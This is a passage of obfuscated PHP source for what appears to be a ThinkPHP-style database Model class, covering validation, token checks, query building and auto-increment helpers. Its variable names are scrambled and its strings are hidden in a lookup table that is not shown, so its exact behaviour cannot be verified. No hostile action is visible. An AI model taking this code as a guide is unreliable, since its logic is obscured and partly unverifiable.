¢Ä¦í = trim($ ¢Ä¦í); if (strpos($ ¢Ä¦í, $úÓ¹ûÆ¿[47])) { if (!isset($ÊÙúğÑì[$úÓ¹ûÆ¿[290]])) { $ÊÙúğÑì[$úÓ¹ûÆ¿[290]] = is_numeric($ÚæÙ§éŞ) ? $ÚæÙ§éŞ : $úÓ¹ûÆ¿[33]; } $Ã—†÷† = $this->db->select($ÊÙúğÑì); if (!empty($Ã—†÷†)) { $ş†ıš‚ = explode($úÓ¹ûÆ¿[47], $ ¢Ä¦í); $ ¢Ä¦í = array_keys($Ã—†÷†[0]); $è¿‹ÜÅ” = array_shift($ ¢Ä¦í); $ÑöœÒ­â = array_shift($ ¢Ä¦í); $ßï¤„Ô® = array(); $œ±öÖÙŸ = count($ş†ıš‚); foreach ($Ã—†÷† as $·û€úè¯) { $²ÊÃ±‡« = $·û€úè¯[$è¿‹ÜÅ”]; if (2 == $œ±öÖÙŸ) { $ßï¤„Ô®[$²ÊÃ±‡«] = $·û€úè¯[$ÑöœÒ­â]; } else { $ßï¤„Ô®[$²ÊÃ±‡«] = is_string($ÚæÙ§éŞ) ? implode($ÚæÙ§éŞ, $·û€úè¯) : $·û€úè¯; } } return $ßï¤„Ô®; } } else { if (!0 !== $ÚæÙ§éŞ) { $ÊÙúğÑì[$úÓ¹ûÆ¿[290]] = is_numeric($ÚæÙ§éŞ) ? $ÚæÙ§éŞ : 1; } if ($ÚæÙ§éŞ === $úÓ¹ûÆ¿[253]) { unset($ÊÙúğÑì[$úÓ¹ûÆ¿[290]]); } $·û€úè¯ = $this->db->select($ÊÙúğÑì); if (!empty($·û€úè¯)) { if ($ÚæÙ§éŞ === $úÓ¹ûÆ¿[253]) { return reset($·û€úè¯[0]); } if (!0 !== $ÚæÙ§éŞ && 1 == $ÊÙúğÑì[$úÓ¹ûÆ¿[290]]) { return reset($·û€úè¯[0]); } foreach ($·û€úè¯ as $¼êĞÚ›™) { $’û£‘øÆ[] = $¼êĞÚ›™[$ ¢Ä¦í]; } return $’û£‘øÆ; } } return null; } public function create($ô’ê’ = '', $Ê°¬ß™¹ = '') { $©£¢Ûæ® =& $_SERVER[¥ÙÌÜ¾ê]; if (empty($ô’ê’)) { $ô’ê’ = $_POST; } elseif (is_object($ô’ê’)) { $ô’ê’ = get_object_vars($ô’ê’); } if (empty($ô’ê’) || !is_array($ô’ê’)) { $this->error = think_lang($©£¢Ûæ®[269]); return !1; } $ô’ê’ = $this->parseFieldsMap($ô’ê’, 0); $Ê°¬ß™¹ = $Ê°¬ß™¹ ? $Ê°¬ß™¹ : (!empty($ô’ê’[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$©£¢Ûæ®[271]])) { $—Æ¦É‡ú = $this->options[$©£¢Ûæ®[271]]; unset($this->options[$©£¢Ûæ®[271]]); } elseif ($Ê°¬ß™¹ == THINK_MODEL_INSERT && isset($this->insertFields)) { $—Æ¦É‡ú = $this->insertFields; } elseif ($Ê°¬ß™¹ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $—Æ¦É‡ú = $this->updateFields; } if (isset($—Æ¦É‡ú)) { if (is_string($—Æ¦É‡ú)) { $—Æ¦É‡ú = explode($©£¢Ûæ®[47], $—Æ¦É‡ú); } if (think_config($©£¢Ûæ®[296])) { $—Æ¦É‡ú[] = think_config($©£¢Ûæ®[297]); } foreach ($ô’ê’ as $İÕ¡ˆŒÄ => $Ò•©¤ ì) { if (!in_array($İÕ¡ˆŒÄ, $—Æ¦É‡ú)) { unset($ô’ê’[$İÕ¡ˆŒÄ]); } } } if (!$this->autoValidation($ô’ê’, $Ê°¬ß™¹)) { return !1; } if (!$this->autoCheckToken($ô’ê’)) { $this->error = think_lang($©£¢Ûæ®[298]); return !1; } if ($this->autoCheckFields) { $—Æ¦É‡ú = $this->getDbFields(); foreach ($ô’ê’ as $İÕ¡ˆŒÄ => $Ò•©¤ ì) { if (!in_array($İÕ¡ˆŒÄ, $—Æ¦É‡ú)) { unset($ô’ê’[$İÕ¡ˆŒÄ]); } elseif (MAGIC_QUOTES_GPC && is_string($Ò•©¤ ì)) { $ô’ê’[$İÕ¡ˆŒÄ] = stripslashes($Ò•©¤ ì); } } } $this->autoOperation($ô’ê’, $Ê°¬ß™¹); $this->data = $ô’ê’; return $ô’ê’; } public function autoCheckToken($èè²Í´˜) { $½öûİÛ· =& $_SERVER[¥ÙÌÜ¾ê]; if (isset($this->options[$½öûİÛ·[299]]) && !$this->options[$½öûİÛ·[299]]) { return !0; } if (think_config($½öûİÛ·[296])) { $«ŞßÔ¸‹ = think_config($½öûİÛ·[297]); if (!isset($èè²Í´˜[$«ŞßÔ¸‹]) || Session::get($«ŞßÔ¸‹)) { return !1; } list($ò›»¾şç, $âÙ¿Æ¾ë) = explode($½öûİÛ·[71], $èè²Í´˜[$«ŞßÔ¸‹]); if ($âÙ¿Æ¾ë && Session::get($«ŞßÔ¸‹ . $½öûİÛ·[95] . $ò›»¾şç) === $âÙ¿Æ¾ë) { Session::remove($«ŞßÔ¸‹ . $½öûİÛ·[95] . $ò›»¾şç); return !0; } if (think_config($½öûİÛ·[300])) { Session::remove($«ŞßÔ¸‹ . $½öûİÛ·[95] . $ò›»¾şç); } return !1; } return !0; } public function regex($ÅİÔà÷¹, $ÁÔ«ËÈò) { $¼¼æ¦ş =& $_SERVER[¥ÙÌÜ¾ê]; $¯ß•“…Ö = array($¼¼æ¦ş[301] => $¼¼æ¦ş[302], $¼¼æ¦ş[303] => $¼¼æ¦ş[304], $¼¼æ¦ş[305] => $¼¼æ¦ş[306], $¼¼æ¦ş[307] => $¼¼æ¦ş[308], $¼¼æ¦ş[309] => $¼¼æ¦ş[310], $¼¼æ¦ş[311] => $¼¼æ¦ş[312], $¼¼æ¦ş[313] => $¼¼æ¦ş[314], $¼¼æ¦ş[288] => $¼¼æ¦ş[315], $¼¼æ¦ş[316] => $¼¼æ¦ş[317]); if (isset($¯ß•“…Ö[strtolower($ÁÔ«ËÈò)])) { $ÁÔ«ËÈò = $¯ß•“…Ö[strtolower($ÁÔ«ËÈò)]; } return preg_match($ÁÔ«ËÈò, $ÅİÔà÷¹) === 1; } private function autoOperation(&$¥çá¬•Û, $ª£ éĞé) { $ÆöÙÆŒ² =& $_SERVER[¥ÙÌÜ¾ê]; if (!empty($this->options[$ÆöÙÆŒ²[318]])) { $¯„·…Ä = $this->options[$ÆöÙÆŒ²[318]]; unset($this->options[$ÆöÙÆŒ²[318]]); } elseif (!empty($this->_auto)) { $¯„·…Ä = $this->_auto; } if (isset($¯„·…Ä)) { foreach ($¯„·…Ä as $óÜÈĞ¥¿) { if (empty($óÜÈĞ¥¿[2])) { $óÜÈĞ¥¿[2] = THINK_MODEL_INSERT; } if ($ª£ éĞé == $óÜÈĞ¥¿[2] || $óÜÈĞ¥¿[2] == THINK_MODEL_BOTH) { switch (trim($óÜÈĞ¥¿[3])) { case $ÆöÙÆŒ²[319]: case $ÆöÙÆŒ²[320]: $Â±±€»ğ = isset($óÜÈĞ¥¿[4]) ? (array) $óÜÈĞ¥¿[4] : array(); if (isset($¥çá¬•Û[$óÜÈĞ¥¿[0]])) { array_unshift($Â±±€»ğ, $¥çá¬•Û[$óÜÈĞ¥¿[0]]); } if ($ÆöÙÆŒ²[319] == $óÜÈĞ¥¿[3]) { $¥çá¬•Û[$óÜÈĞ¥¿[0]] = call_user_func_array($óÜÈĞ¥¿[1], $Â±±€»ğ); } else { $¥çá¬•Û[$óÜÈĞ¥¿[0]] = call_user_func_array(array(&$this, $óÜÈĞ¥¿[1]), $Â±±€»ğ); } break; case $ÆöÙÆŒ²[271]: $¥çá¬•Û[$óÜÈĞ¥¿[0]] = $¥çá¬•Û[$óÜÈĞ¥¿[1]]; break; case $ÆöÙÆŒ²[321]: if ($ÆöÙÆŒ²[33] === $¥çá¬•Û[$óÜÈĞ¥¿[0]]) { unset($¥çá¬•Û[$óÜÈĞ¥¿[0]]); } break; case $ÆöÙÆŒ²[322]: default: $¥çá¬•Û[$óÜÈĞ¥¿[0]] = $óÜÈĞ¥¿[1]; } if (!1 === $¥çá¬•Û[$óÜÈĞ¥¿[0]]) { unset($¥çá¬•Û[$óÜÈĞ¥¿[0]]); } } } } return $¥çá¬•Û; } protected function autoValidation($è´©á¾±, $»ÍÌùŸ´) { $¼‰ÆÎ¡ =& $_SERVER[¥ÙÌÜ¾ê]; if (!empty($this->options[$¼‰ÆÎ¡[323]])) { $’å‡•®° = $this->options[$¼‰ÆÎ¡[323]]; unset($this->options[$¼‰ÆÎ¡[323]]); } elseif (!empty($this->_validate)) { $’å‡•®° = $this->_validate; } if (isset($’å‡•®°)) { if ($this->patchValidate) { $this->error = array(); } foreach ($’å‡•®° as $öË–ı† => $…„é›•¨) { if (empty($…„é›•¨[5]) || $…„é›•¨[5] == THINK_MODEL_BOTH || $…„é›•¨[5] == $»ÍÌùŸ´) { if (0 == strpos($…„é›•¨[2], $¼‰ÆÎ¡[324]) && strpos($…„é›•¨[2], $¼‰ÆÎ¡[325])) { $…„é›•¨[2] = think_lang(substr($…„é›•¨[2], 2, -1)); } $…„é›•¨[3] = isset($…„é›•¨[3]) ? $…„é›•¨[3] : THINK_EXISTS_VALIDATE; $…„é›•¨[4] = isset($…„é›•¨[4]) ? $…„é›•¨[4] : $¼‰ÆÎ¡[326]; switch ($…„é›•¨[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($è´©á¾±, $…„é›•¨)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¼‰ÆÎ¡[33] != trim($è´©á¾±[$…„é›•¨[0]])) { if (!1 === $this->_validationField($è´©á¾±, $…„é›•¨)) { return !1; } } break; default: if (isset($è´©á¾±[$…„é›•¨[0]])) { if (!1 === $this->_validationField($è´©á¾±, $…„é›•¨)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ƒ½ì¬Â, $ÏåÂâ) { if (!1 === $this->_validationFieldItem($ƒ½ì¬Â, $ÏåÂâ)) { if ($this->patchValidate) { $this->error[$ÏåÂâ[0]] = $ÏåÂâ[2]; } else { $this->error = $ÏåÂâ[2]; return !1; } } return; } protected function _validationFieldItem($˜ì³—ñ†, $ûªÅØ³Ú) { $‹÷òåü“ =& $_SERVER[¥ÙÌÜ¾ê]; switch (strtolower(trim($ûªÅØ³Ú[4]))) { case $‹÷òåü“[319]: case $‹÷òåü“[320]: $ø–Ì²Õñ = isset($ûªÅØ³Ú[6]) ? (array) $ûªÅØ³Ú[6] : array(); if (is_string($ûªÅØ³Ú[0]) && strpos($ûªÅØ³Ú[0], $‹÷òåü“[47])) { $ûªÅØ³Ú[0] = explode($‹÷òåü“[47], $ûªÅØ³Ú[0]); } if (is_array($ûªÅØ³Ú[0])) { foreach ($ûªÅØ³Ú[0] as $‚Ê£ÅÈÄ) { $Ì¯¾ÌäØ[$‚Ê£ÅÈÄ] = $˜ì³—ñ†[$‚Ê£ÅÈÄ]; } array_unshift($ø–Ì²Õñ, $Ì¯¾ÌäØ); } else { array_unshift($ø–Ì²Õñ, $˜ì³—ñ†[$ûªÅØ³Ú[0]]); } if ($‹÷òåü“[319] == $ûªÅØ³Ú[4]) { return call_user_func_array($ûªÅØ³Ú[1], $ø–Ì²Õñ); } else { return call_user_func_array(array(&$this, $ûªÅØ³Ú[1]), $ø–Ì²Õñ); } case $‹÷òåü“[327]: return $˜ì³—ñ†[$ûªÅØ³Ú[0]] == $˜ì³—ñ†[$ûªÅØ³Ú[1]]; case $‹÷òåü“[328]: if (is_string($ûªÅØ³Ú[0]) && strpos($ûªÅØ³Ú[0], $‹÷òåü“[47])) { $ûªÅØ³Ú[0] = explode($‹÷òåü“[47], $ûªÅØ³Ú[0]); } $ß†’Ş€ = array(); if (is_array($ûªÅØ³Ú[0])) { foreach ($ûªÅØ³Ú[0] as $‚Ê£ÅÈÄ) { $ß†’Ş€[$‚Ê£ÅÈÄ] = $˜ì³—ñ†[$‚Ê£ÅÈÄ]; } } else { $ß†’Ş€[$ûªÅØ³Ú[0]] = $˜ì³—ñ†[$ûªÅØ³Ú[0]]; } if (!empty($˜ì³—ñ†[$this->getPk()])) { $ß†’Ş€[$this->getPk()] = array($‹÷òåü“[329], $˜ì³—ñ†[$this->getPk()]); } if ($this->where($ß†’Ş€)->find()) { return !1; } return !0; default: return $this->check($˜ì³—ñ†[$ûªÅØ³Ú[0]], $ûªÅØ³Ú[1], $ûªÅØ³Ú[4]); } } public function check($ªãñá›æ, $‡ÔÛÏª, $¦í¡ßà½ = "\162\145\147\x65\x78") { $ºœôÆô =& $_SERVER[¥ÙÌÜ¾ê]; $¦í¡ßà½ = strtolower(trim($¦í¡ßà½)); switch ($¦í¡ßà½) { case $ºœôÆô[7]: case $ºœôÆô[330]: $ÀˆÓÇ²Ü = is_array($‡ÔÛÏª) ? $‡ÔÛÏª : explode($ºœôÆô[47], $‡ÔÛÏª); return $¦í¡ßà½ == $ºœôÆô[7] ? in_array($ªãñá›æ, $ÀˆÓÇ²Ü) : !in_array($ªãñá›æ, $ÀˆÓÇ²Ü); case $ºœôÆô[331]: case $ºœôÆô[332]: if (is_array($‡ÔÛÏª)) { $ÕØŞú = $‡ÔÛÏª[0]; $Â‘ÙïÎ = $‡ÔÛÏª[1]; } else { list($ÕØŞú, $Â‘ÙïÎ) = explode($ºœôÆô[47], $‡ÔÛÏª); } return $¦í¡ßà½ == $ºœôÆô[331] ? $ªãñá›æ >= $ÕØŞú && $ªãñá›æ <= $Â‘ÙïÎ : $ªãñá›æ < $ÕØŞú || $ªãñá›æ > $Â‘ÙïÎ; case $ºœôÆô[333]: case $ºœôÆô[334]: return $¦í¡ßà½ == $ºœôÆô[333] ? $ªãñá›æ == $‡ÔÛÏª : $ªãñá›æ != $‡ÔÛÏª; case $ºœôÆô[335]: $ÉßñÉè¶ = mb_strlen($ªãñá›æ, $ºœôÆô[336]); if (strpos($‡ÔÛÏª, $ºœôÆô[47])) { list($ÕØŞú, $Â‘ÙïÎ) = explode($ºœôÆô[47], $‡ÔÛÏª); return $ÉßñÉè¶ >= $ÕØŞú && $ÉßñÉè¶ <= $Â‘ÙïÎ; } else { return $ÉßñÉè¶ == $‡ÔÛÏª; } case $ºœôÆô[337]: list($§¿ÎŸ‹£, $†ÆáÂœˆ) = explode($ºœôÆô[47], $‡ÔÛÏª); if (!is_numeric($§¿ÎŸ‹£)) { $§¿ÎŸ‹£ = strtotime($§¿ÎŸ‹£); } if (!is_numeric($†ÆáÂœˆ)) { $†ÆáÂœˆ = strtotime($†ÆáÂœˆ); } return NOW_TIME >= $§¿ÎŸ‹£ && NOW_TIME <= $†ÆáÂœˆ; case $ºœôÆô[338]: return in_array(get_client_ip(), explode($ºœôÆô[47], $‡ÔÛÏª)); case $ºœôÆô[339]: return !in_array(get_client_ip(), explode($ºœôÆô[47], $‡ÔÛÏª)); case $ºœôÆô[326]: default: return $this->regex($ªãñá›æ, $‡ÔÛÏª); } } public function query($º¾Àˆµº, $¦Áùâ™ = false) { $Ó¦™ÑÀ› =& $_SERVER[¥ÙÌÜ¾ê]; if (!is_bool($¦Áùâ™) && !is_array($¦Áùâ™)) { $¦Áùâ™ = func_get_args(); array_shift($¦Áùâ™); } $º¾Àˆµº = str_replace(array($Ó¦™ÑÀ›[229], $Ó¦™ÑÀ›[340]), $Ó¦™ÑÀ›[50], $º¾Àˆµº); $º¾Àˆµº = $this->parseSql($º¾Àˆµº, $¦Áùâ™); return $this->db->query($º¾Àˆµº); } public function execute($Ğ†Î‚ë, $­óÌ»›› = false) { if (!is_bool($­óÌ»››) && !is_array($­óÌ»››)) { $­óÌ»›› = func_get_args(); array_shift($­óÌ»››); } $Ğ†Î‚ë = $this->parseSql($Ğ†Î‚ë, $­óÌ»››); return $this->db->execute($Ğ†Î‚ë); } protected function parseSql($¬îŒËÔ, $â««˜Ùş) { $ÄÒô¢ú =& $_SERVER[¥ÙÌÜ¾ê]; if (!0 === $â««˜Ùş) { $×¶”î—‹ = $this->_parseOptions(); $¬îŒËÔ = $this->db->parseSql($¬îŒËÔ, $×¶”î—‹); } elseif (is_array($â««˜Ùş)) { $â««˜Ùş = array_map(array($this->db, $ÄÒô¢ú[341]), $â««˜Ùş); $¬îŒËÔ = vsprintf($¬îŒËÔ, $â««˜Ùş); } else { $¬îŒËÔ = strtr($¬îŒËÔ, array($ÄÒô¢ú[342] => $this->getTableName(), $ÄÒô¢ú[343] => think_config($ÄÒô¢ú[242]))); } $this->db->setModel($this->name); return $¬îŒËÔ; } public function db($ä”à÷óã = '', $ª…ÆúÇ  = '', $£·ïÂ¨ª = array()) { $¿—‹€ƒê =& $_SERVER[¥ÙÌÜ¾ê]; if ($¿—‹€ƒê[33] === $ä”à÷óã && $this->db) { return $this->db; } static $ˆ½—Ğœ– = array(); static $ÃáşÕà« = array(); if (!isset($ÃáşÕà«[$ä”à÷óã]) || isset($ÃáşÕà«[$ä”à÷óã]) && $ª…ÆúÇ  && $ˆ½—Ğœ–[$ä”à÷óã] != $ª…ÆúÇ ) { if (!empty($ª…ÆúÇ ) && is_string($ª…ÆúÇ ) && !1 === strpos($ª…ÆúÇ , $¿—‹€ƒê[8])) { $ª…ÆúÇ  = think_config($ª…ÆúÇ ); } $ä”à÷óã = think_guid($ª…ÆúÇ ); $ÃáşÕà«[$ä”à÷óã] = Db::getInstance($ª…ÆúÇ ); } elseif (NULL === $ª…ÆúÇ ) { $ÃáşÕà«[$ä”à÷óã]->close(); unset($ÃáşÕà«[$ä”à÷óã]); return; } if (!empty($£·ïÂ¨ª)) { if (is_string($£·ïÂ¨ª)) { parse_str($£·ïÂ¨ª, $£·ïÂ¨ª); } foreach ($£·ïÂ¨ª as $…úä÷èó => $êàÏ‹–µ) { $this->setProperty($…úä÷èó, $êàÏ‹–µ); } } $ˆ½—Ğœ–[$ä”à÷óã] = $ª…ÆúÇ ; $this->db = $ÃáşÕà«[$ä”à÷óã]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Ÿ€Ç«‘ë = get_class($this); if ($Ÿ€Ç«‘ë == $_SERVER[¥ÙÌÜ¾ê][344]) { return $this->name; } $this->name = substr($Ÿ€Ç«‘ë, 0, -5); } return $this->name; } public function getTableName() { $åïŒ±‹ˆ =& $_SERVER[¥ÙÌÜ¾ê]; if (empty($this->trueTableName)) { $òÖ•†Î’ = !empty($this->tablePrefix) ? $this->tablePrefix : $åïŒ±‹ˆ[33]; if (!empty($this->tableName)) { $òÖ•†Î’ .= $this->tableName; } else { $òÖ•†Î’ .= think_parse_name($this->name); } $this->trueTableName = strtolower($òÖ•†Î’); } return (!empty($this->dbName) ? $this->dbName . $åïŒ±‹ˆ[95] : $åïŒ±‹ˆ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $¨˜¼åØ¢ =& $_SERVER[¥ÙÌÜ¾ê]; return isset($this->fields[$¨˜¼åØ¢[249]]) ? $this->fields[$¨˜¼åØ¢[249]] : $this->pk; } public function getDbFields() { $œÊ•ç =& $_SERVER[¥ÙÌÜ¾ê]; if (isset($this->options[$œÊ•ç[277]])) { $åÚ£¥¶ = $this->db->getFields($this->options[$œÊ•ç[277]]); return $åÚ£¥¶ ? array_keys($åÚ£¥¶) : !1; } if ($this->fields) { $åÚ£¥¶ = $this->fields; unset($åÚ£¥¶[$œÊ•ç[248]], $åÚ£¥¶[$œÊ•ç[249]], $åÚ£¥¶[$œÊ•ç[250]], $åÚ£¥¶[$œÊ•ç[247]]); return $åÚ£¥¶; } return !1; } public function data($â÷åÆ­ = '') { $ªìœÙˆÅ =& $_SERVER[¥ÙÌÜ¾ê]; if ($ªìœÙˆÅ[33] === $â÷åÆ­ && !empty($this->data)) { return $this->data; } if (is_object($â÷åÆ­)) { $â÷åÆ­ = get_object_vars($â÷åÆ­); } elseif (is_string($â÷åÆ­)) { parse_str($â÷åÆ­, $â÷åÆ­); } elseif (!is_array($â÷åÆ­)) { think_exception(think_lang($ªìœÙˆÅ[269])); } $this->data = $â÷åÆ­; return $this; } public function join($ÎÎ¼²¹á) { $¨şŸŸÃÍ =& $_SERVER[¥ÙÌÜ¾ê]; if (is_array($ÎÎ¼²¹á)) { $this->options[$¨şŸŸÃÍ[280]] = $ÎÎ¼²¹á; } elseif (!empty($ÎÎ¼²¹á)) { $this->options[$¨şŸŸÃÍ[280]][] = $ÎÎ¼²¹á; } return $this; } public function union($°ŞÇÎ´¼, $ßñ„Ï½ã = false) { $î«¤ó³İ =& $_SERVER[¥ÙÌÜ¾ê]; if (empty($°ŞÇÎ´¼)) { return $this; } if ($ßñ„Ï½ã) { $this->options[$î«¤ó³İ[345]][$î«¤ó³İ[346]] = !0; } if (is_object($°ŞÇÎ´¼)) { $°ŞÇÎ´¼ = get_object_vars($°ŞÇÎ´¼); } if (is_string($°ŞÇÎ´¼)) { $‚ÚÏ‰’ = $°ŞÇÎ´¼; } elseif (is_array($°ŞÇÎ´¼)) { if (isset($°ŞÇÎ´¼[0])) { $this->options[$î«¤ó³İ[345]] = array_merge($this->options[$î«¤ó³İ[345]], $°ŞÇÎ´¼); return $this; } else { $‚ÚÏ‰’ = $°ŞÇÎ´¼; } } else { think_exception(think_lang($î«¤ó³İ[269])); } $this->options[$î«¤ó³İ[345]][] = $‚ÚÏ‰’; return $this; } public function cache($—­¥Ä™¾ = true, $ãŠô€ş° = null, $ê‰Â§Õ = '') { $—óÜ˜È¤ =& $_SERVER[¥ÙÌÜ¾ê]; if (!1 !== $—­¥Ä™¾) { $this->options[$—óÜ˜È¤[347]] = array($—óÜ˜È¤[93] => $—­¥Ä™¾, $—óÜ˜È¤[337] => $ãŠô€ş°, $—óÜ˜È¤[29] => $ê‰Â§Õ); } return $this; } public function field($şš¾‘âÉ, $üĞÂíØ± = false) { $ü²Ü¶Ÿ =& $_SERVER[¥ÙÌÜ¾ê]; if (!0 === $şš¾‘âÉ) { $óüªñÜ = $this->getDbFields(); $şš¾‘âÉ = $óüªñÜ ? $óüªñÜ : $ü²Ü¶Ÿ[182]; } elseif ($üĞÂíØ±) { if (is_string($şš¾‘âÉ)) { $şš¾‘âÉ = explode($ü²Ü¶Ÿ[47], $şš¾‘âÉ); } $óüªñÜ = $this->getDbFields(); $şš¾‘âÉ = $óüªñÜ ? array_diff($óüªñÜ, $şš¾‘âÉ) : $şš¾‘âÉ; } $this->options[$ü²Ü¶Ÿ[271]] = $şš¾‘âÉ; return $this; } public function scope($¯ìŒ‡ = '', $ˆ¬ÕÛòÒ = NULL) { $ñ³±æ²ä =& $_SERVER[¥ÙÌÜ¾ê]; if ($ñ³±æ²ä[33] === $¯ìŒ‡) { if (isset($this->_scope[$ñ³±æ²ä[34]])) { $õßİï¥ß = $this->_scope[$ñ³±æ²ä[34]]; } else { return $this; } } elseif (is_string($¯ìŒ‡)) { $‘’Ş²Ç = explode($ñ³±æ²ä[47], $¯ìŒ‡); $õßİï¥ß = array(); foreach ($‘’Ş²Ç as $ä‡ë½¾Ù) { if (!isset($this->_scope[$ä‡ë½¾Ù])) { continue; } $õßİï¥ß = array_merge($õßİï¥ß, $this->_scope[$ä‡ë½¾Ù]); } if (!empty($ˆ¬ÕÛòÒ) && is_array($ˆ¬ÕÛòÒ)) { $õßİï¥ß = array_merge($õßİï¥ß, $ˆ¬ÕÛòÒ); } } elseif (is_array($¯ìŒ‡)) { $õßİï¥ß = $¯ìŒ‡; } if (is_array($õßİï¥ß) && !empty($õßİï¥ß)) { $this->options = array_merge($this->options, array_change_key_case($õßİï¥ß)); } return $this; } public function where($×Ë´À ø, $Ç»¢ÒÖ = null) { $˜±–“ŸÑ =& $_SERVER[¥ÙÌÜ¾ê]; if (!is_null($Ç»¢ÒÖ) && is_string($×Ë´À ø)) { if (!is_array($Ç»¢ÒÖ)) { $Ç»¢ÒÖ = func_get_args(); array_shift($Ç»¢ÒÖ); } $Ç»¢ÒÖ = array_map(array($this->db, $˜±–“ŸÑ[341]), $Ç»¢ÒÖ); $×Ë´À ø = vsprintf($×Ë´À ø, $Ç»¢ÒÖ); } elseif (is_object($×Ë´À ø)) { $×Ë´À ø = get_object_vars($×Ë´À ø); } elseif (is_array($×Ë´À ø)) { foreach ($×Ë´À ø as $ö¤Ø¿Ğû => $ø„ïñ‚­) { if ((is_numeric($ö¤Ø¿Ğû) || !$ö¤Ø¿Ğû) && is_string($ø„ïñ‚­)) { if (strpos($ø„ïñ‚­, $˜±–“ŸÑ[348]) === 0) { continue; } think_trace($˜±–“ŸÑ[349], $˜±–“ŸÑ[33], $˜±–“ŸÑ[46]); die; } } } if (is_string($×Ë´À ø) && $˜±–“ŸÑ[33] != $×Ë´À ø) { $ñ°¬ñ–ç = array(); $ñ°¬ñ–ç[$˜±–“ŸÑ[350]] = $×Ë´À ø; $×Ë´À ø = $ñ°¬ñ–ç; } if (isset($this->options[$˜±–“ŸÑ[273]])) { $this->options[$˜±–“ŸÑ[273]] = array_merge($this->options[$˜±–“ŸÑ[273]], $×Ë´À ø); } else { $this->options[$˜±–“ŸÑ[273]] = $×Ë´À ø; } return $this; } public function limit($¶ÉÖ€Ö, $Ú·¦´¾¨ = null) { $ÙÃÔ¦Š =& $_SERVER[¥ÙÌÜ¾ê]; $this->options[$ÙÃÔ¦Š[290]] = is_null($Ú·¦´¾¨) ? $¶ÉÖ€Ö : $¶ÉÖ€Ö . $ÙÃÔ¦Š[47] . $Ú·¦´¾¨; return $this; } public function page($ıÛ’ñ¥æ, $©ë”ß¤ò = null) { $«ë—šë³ =& $_SERVER[¥ÙÌÜ¾ê]; $this->options[$«ë—šë³[351]] = is_null($©ë”ß¤ò) ? $ıÛ’ñ¥æ : $ıÛ’ñ¥æ . $«ë—šë³[47] . $©ë”ß¤ò; return $this; } public function comment($èÙÁ±¢) { $this->options[$_SERVER[¥ÙÌÜ¾ê][352]] = $èÙÁ±¢; return $this; } public function setProperty($şÌ¯ÉŸ, $°ú°¹ê) { if (property_exists($this, $şÌ¯ÉŸ)) { $this->{$şÌ¯ÉŸ} = $°ú°¹ê; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\x66\171\x54\x69\x6d\x65", "\164\151\155\x65", "\151\x6e\x73\145\x72\x74\54\165\x70\x64\141\164\145", "\x66\x75\156\x63\164\151\x6f\x6e"), array("\x63\x72\145\x61\x74\x65\x54\x69\155\x65", "\164\x69\x6d\x65", "\x69\x6e\x73\x65\x72\164", "\x66\x75\x6e\143\x74\151\157\x6e")); public function setDataAuto($˜ØÚƒ£) { $this->dataAuto = $˜ØÚƒ£; } public function __construct($úº¦˜È = '', $È…§¡¬¡ = '', $ÒÒı¿éª = '') { parent::__construct($úº¦˜È, $È…§¡¬¡, $ÒÒı¿éª); } protected $tableMeta = array(); protected function _beforeInsert(&$Ü‡£Ğ¶Ÿ, $ºø¯ˆâŞ) { $‚•”ÒöË =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->checkDataAutoHas($‚•”ÒöË[353])) { return; } $this->dataBeforeFilter($Ü‡£Ğ¶Ÿ, $‚•”ÒöË[353]); } protected function _beforeUpdate(&$®€½, $ËÓÌî©é) { $ºÓÔÊöÂ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->checkDataAutoHas($ºÓÔÊöÂ[354])) { return; } $this->dataBeforeFilter($®€½, $ºÓÔÊöÂ[354]); } protected function _afterSelect(&$¬ÏÖ¼•˜, $·¥Şå”Õ) { if (!is_array($¬ÏÖ¼•˜)) { return; } if (!$this->checkDataAutoHas($_SERVER[¥ÙÌÜ¾ê][355])) { return; } foreach ($¬ÏÖ¼•˜ as &$º®Ş…æ·) { $this->dataAfterFilter($º®Ş…æ·); } unset($º®Ş…æ·); } protected function _afterFind(&$É“«ş€Ÿ, $ÊÇÛ–Ò¹) { if (!is_array($É“«ş€Ÿ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¥ÙÌÜ¾ê][355])) { return; } $this->dataAfterFilter($É“«ş€Ÿ); } public static function textEncode($å™©ä¡ˆ) { if (!$å™©ä¡ˆ) { return $å™©ä¡ˆ; } $¶¸¬¸Ñ = json_encode($å™©ä¡ˆ); $¶¸¬¸Ñ = preg_replace_callback($_SERVER[¥ÙÌÜ¾ê][356], function ($ƒÏ‚Â—”) { return addslashes($ƒÏ‚Â—”[0]); }, $¶¸¬¸Ñ); return json_decode($¶¸¬¸Ñ); } public static function textDecode($ÂÖÑ¿¯) { $ã•óËğ =& $_SERVER[¥ÙÌÜ¾ê]; $…‡ê†‡¼ = json_encode($ÂÖÑ¿¯); $…‡ê†‡¼ = preg_replace_callback($ã•óËğ[357], function ($¤ÛÙûêş) { return $_SERVER[¥ÙÌÜ¾ê][97]; }, $…‡ê†‡¼); return json_decode($…‡ê†‡¼); } public function setAutoIncrement($¥€ˆı³Ù) { $‚¦Ì‚•« = array($this->getPk() => $¥€ˆı³Ù); $âÁÄõì = $this->data($‚¦Ì‚•«)->add(); if ($âÁÄõì) { $this->delete($âÁÄõì); } } public function getAutoIncrement() { $’û×¥àğ = $this->getTableName(); $çûíËö± = $this->max($this->getPk()); $Õ¤ÌªÂİ = 